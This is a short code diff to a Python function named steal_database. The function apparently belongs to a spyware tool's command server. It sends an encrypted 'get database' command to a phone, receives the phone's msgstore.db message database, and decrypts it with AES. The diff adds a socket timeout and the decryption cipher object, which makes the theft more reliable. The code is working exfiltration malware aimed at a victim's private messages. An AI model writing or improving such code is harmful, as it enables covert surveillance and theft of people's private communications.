@@ -27,6 +27,7 @@ def steal_database():
     conn.send(ciphertext)
     print("Encrypted 'get database' command sent to phone")
     count = 0
+    conn.settimeout(5)
     with open("msgstore.db.enc", "wb") as db:
         database = conn.recv(8192)
         while database:
@@ -36,6 +37,8 @@ def steal_database():
             db.write(database)
             database = conn.recv(8192)
         db.write(database)
+
+    obj = AES.new(bytes.fromhex(key), AES.MODE_CBC, bytes.fromhex(iv))
     print("Encrypted database has been received")
     with open('msgstore.db.enc', 'rb') as db_enc:
         with open("msgstore.db", 'wb') as db:
